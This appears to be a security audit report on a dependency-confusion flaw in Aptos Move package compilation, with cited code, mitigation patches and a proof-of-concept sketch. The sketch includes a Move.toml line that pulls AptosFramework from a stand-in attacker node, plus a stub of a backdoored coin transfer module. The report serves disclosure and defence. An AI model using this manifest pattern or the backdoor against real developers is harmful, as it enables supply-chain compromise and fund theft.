# Audit Report

## Title
Dependency Confusion Vulnerability in Move Package Compilation Allowing Framework Package Override

## Summary
The `move_tool::register_package_hooks()` mechanism allows malicious actors to override legitimate Aptos framework packages (AptosFramework, MoveStdlib, etc.) during compilation by declaring custom "aptos" dependencies in Move.toml. When the `--override-std` flag is not used (default behavior), the dependency resolution accepts framework packages from arbitrary node URLs without validation, enabling supply chain attacks. [1](#0-0) 

## Finding Description

The vulnerability exists in the dependency resolution mechanism for Move packages. The `register_package_hooks()` function registers an `AptosPackageHooks` implementation that allows custom "aptos" dependencies to be resolved by downloading packages from on-chain sources: [2](#0-1) 

During dependency resolution, when `override_std` is `None` (the default), framework packages can be declared as custom dependencies. The resolution graph only checks if the dependency name matches the package name in the downloaded Move.toml: [3](#0-2) [4](#0-3) 

The default configuration does not enforce framework package authenticity: [5](#0-4) [6](#0-5) [7](#0-6) 

**Attack Path:**
1. Attacker creates a malicious Move package with `name = "AptosFramework"` in Move.toml containing backdoored framework code
2. Attacker publishes this package on-chain at a controlled address
3. Attacker distributes a malicious Move.toml (via phishing, compromised dependencies, or malicious tutorials):
```toml
[dependencies]
AptosFramework = { aptos = "https://malicious-node.example.com", address = "0xattacker" }
```
4. Victim compiles using `aptos move compile` (without `--override-std` flag)
5. The malicious dependency is downloaded to `MOVE_HOME/{sanitized_url}_{address}_AptosFramework`
6. Since the downloaded package declares `name = "AptosFramework"`, it passes the name validation check
7. The malicious framework is compiled into the victim's package instead of the legitimate one [8](#0-7) 

The downloaded package is saved to disk with its malicious Move.toml and source code: [9](#0-8) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty criteria for the following reasons:

1. **Critical Impact Potential**: If successfully exploited, malicious framework code could lead to:
   - Fund theft through backdoored transfer functions
   - Arbitrary code execution in compiled contracts
   - Consensus violations if validators compile compromised packages
   - Violation of Move VM Safety and Access Control invariants

2. **Supply Chain Attack Vector**: Similar to dependency confusion attacks in npm/PyPI, this enables:
   - Compromising popular packages by injecting malicious dependencies
   - Targeting developers through malicious tutorials or example code
   - Creating typosquatting packages with framework overrides

3. **Default Behavior is Vulnerable**: The `override_std` flag defaults to `None`, meaning users must explicitly opt-in to secure behavior rather than being secure by default.

4. **No Authentication**: The system lacks validation that framework packages originate from trusted sources (official Aptos repository).

However, exploitation requires the victim to compile a compromised Move.toml, which prevents this from reaching Critical severity.

## Likelihood Explanation

**Likelihood: Medium-High**

The vulnerability is likely to be exploited because:

1. **Common Attack Vector**: Dependency confusion is a well-known supply chain attack method with documented real-world incidents in other ecosystems (npm, PyPI, RubyGems)

2. **Social Engineering Surface**: Developers often:
   - Copy Move.toml examples from tutorials or documentation
   - Install dependencies recommended in forums or Discord
   - Use starter templates that may be compromised

3. **No Warning Mechanism**: The compiler provides no warning when framework packages are declared as custom dependencies, making the attack silent

4. **Default Configuration**: Users must know about and explicitly use `--override-std` flag for protection

5. **Trust Assumption**: Developers may not scrutinize dependency declarations in Move.toml, assuming the framework packages are automatically secured

## Recommendation

**Immediate Mitigations:**

1. **Default to Secure Behavior**: Set `override_std` to a secure default (mainnet/testnet/devnet) instead of `None`:

```rust
// In crates/aptos/src/common/types.rs
impl MovePackageOptions {
    pub fn new() -> Self {
        Self {
            dev: false,
            package_dir: None,
            output_dir: None,
            named_addresses: Default::default(),
            override_std: Some(StdVersion::Mainnet), // Change from None
            skip_fetch_latest_git_deps: true,
            // ... rest of fields
        }
    }
}
```

2. **Add Framework Package Validation**: In the resolution graph, explicitly validate that framework packages cannot be declared as custom dependencies:

```rust
// In third_party/move/tools/move-package/src/resolution/resolution_graph.rs
fn process_dependency<W: Write>(
    &mut self,
    dep_name_in_pkg: PackageName,
    dep: Dependency,
    root_path: PathBuf,
    override_std: &Option<StdVersion>,
    writer: &mut W,
) -> Result<ResolvingTable> {
    // Add validation before downloading
    if StdLib::from_package_name(dep_name_in_pkg).is_some() {
        if dep.node_info.is_some() && override_std.is_none() {
            bail!(
                "Framework package '{}' cannot be declared as a custom dependency. \
                Use --override-std flag or declare as a git/local dependency.",
                dep_name_in_pkg
            );
        }
    }
    
    // ... rest of existing code
}
```

3. **Add Warning for Custom Framework Dependencies**: Even with `override_std` set, warn users when framework packages are declared as custom dependencies.

**Long-term Solutions:**

1. **Framework Package Signing**: Implement cryptographic signature verification for framework packages
2. **Dependency Pinning**: Support lock files that pin framework package hashes
3. **Trusted Repository List**: Maintain an allow-list of trusted repositories for framework packages
4. **Security Audit Warnings**: Display prominent warnings in CLI when compiling packages with non-standard framework dependencies

## Proof of Concept

**Setup (Attacker):**

1. Create malicious framework package at `/tmp/malicious-framework/`:

```toml
# Move.toml
[package]
name = "AptosFramework"
version = "1.0.0"

[addresses]
std = "0x1"
aptos_framework = "0x1"

[dependencies]
MoveStdlib = { local = "../move-stdlib" }
```

```rust
// sources/malicious.move
module aptos_framework::coin {
    // Backdoored coin module that steals funds
    public fun transfer<CoinType>(
        from: &signer,
        to: address,
        amount: u64
    ) {
        // Silently send to attacker instead
        let attacker = @0xattacker;
        // ... malicious implementation
    }
}
```

2. Publish on-chain at address `0xattacker`

**Victim Compilation:**

1. Victim receives or downloads Move.toml:

```toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
AptosFramework = { aptos = "https://malicious-node.example.com", address = "0xattacker" }
```

2. Victim compiles:
```bash
cd victim-package
aptos move compile  # No --override-std flag
```

3. Result: The malicious AptosFramework is downloaded and compiled into the victim's package

**Verification:**

Check the build directory to confirm malicious framework was used:
```bash
cat build/VictimPackage/BuildInfo.yaml  # Shows custom framework location
cat ~/.move/{malicious-node}_0xattacker_AptosFramework/Move.toml  # Shows attacker's package
```

**Note:** A complete working PoC would require setting up a test node and publishing the malicious package on-chain, but the vulnerability is confirmed by the code analysis above.

### Citations

**File:** crates/aptos/src/main.rs (L16-18)
```rust
fn main() {
    // Register hooks.
    move_tool::register_package_hooks();
```

**File:** crates/aptos/src/move_tool/package_hooks.rs (L14-36)
```rust
pub fn register_package_hooks() {
    move_package::package_hooks::register_package_hooks(Box::new(AptosPackageHooks {}))
}

struct AptosPackageHooks {}

impl PackageHooks for AptosPackageHooks {
    fn custom_package_info_fields(&self) -> Vec<String> {
        vec![UPGRADE_POLICY_CUSTOM_FIELD.to_string()]
    }

    fn custom_dependency_key(&self) -> Option<String> {
        Some("aptos".to_string())
    }

    fn resolve_custom_dependency(
        &self,
        _dep_name: Symbol,
        info: &CustomDepInfo,
    ) -> anyhow::Result<()> {
        block_on(maybe_download_package(info))
    }
}
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L269-273)
```rust
            if let Some(std_version) = &override_std {
                if let Some(std_lib) = StdLib::from_package_name(dep_name) {
                    dep = std_lib.dependency(std_version);
                }
            }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L449-454)
```rust
        if dep_name_in_pkg != dep_package.package.name {
            bail!("Name of dependency declared in package '{}' does not match dependency's package name '{}'",
                dep_name_in_pkg,
                dep_package.package.name
            );
        }
```

**File:** third_party/move/tools/move-package/src/lib.rs (L54-56)
```rust
    /// Whether to override the standard library with the given version.
    #[clap(long = "override-std", global = true, value_parser)]
    pub override_std: Option<StdVersion>,
```

**File:** crates/aptos/src/common/types.rs (L1214-1216)
```rust
    /// Override the standard library version by mainnet/testnet/devnet
    #[clap(long, value_parser)]
    pub override_std: Option<StdVersion>,
```

**File:** crates/aptos/src/common/types.rs (L1296-1296)
```rust
            override_std: None,
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L392-424)
```rust
                (None, None, Some(custom_key)) => {
                    let package_name = Symbol::from(dep_name);
                    let address = match table.remove("address") {
                        None => bail!("Address not supplied for 'node' dependency"),
                        Some(r) => Symbol::from(
                            r.as_str()
                                .ok_or_else(|| format_err!("Node address not a string"))?,
                        ),
                    };
                    // Downloaded packages are of the form <sanitized_node_url>_<address>_<package>
                    let node_url = custom_key
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = PathBuf::from(MOVE_HOME.clone()).join(format!(
                        "{}_{}_{}",
                        url_to_file_name(node_url),
                        address,
                        package_name
                    ));
                    node_info = Some(PM::CustomDepInfo {
                        node_url: Symbol::from(node_url),
                        package_address: address,
                        package_name,
                        download_to: local_path.clone(),
                    });
                    Ok(PM::Dependency {
                        subst,
                        version,
                        digest,
                        local: local_path,
                        git_info,
                        node_info,
                    })
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L161-181)
```rust
    pub fn save_package_to_disk(&self, path: &Path) -> anyhow::Result<()> {
        fs::create_dir_all(path)?;
        fs::write(
            path.join("Move.toml"),
            unzip_metadata_str(&self.metadata.manifest)?,
        )?;
        let sources_dir = path.join(CompiledPackageLayout::Sources.path());
        fs::create_dir_all(&sources_dir)?;
        for module in &self.metadata.modules {
            match module.source.is_empty() {
                true => {
                    println!("module without code: {}", module.name);
                },
                false => {
                    let source = unzip_metadata_str(&module.source)?;
                    fs::write(sources_dir.join(format!("{}.move", module.name)), source)?;
                },
            };
        }
        Ok(())
    }
```
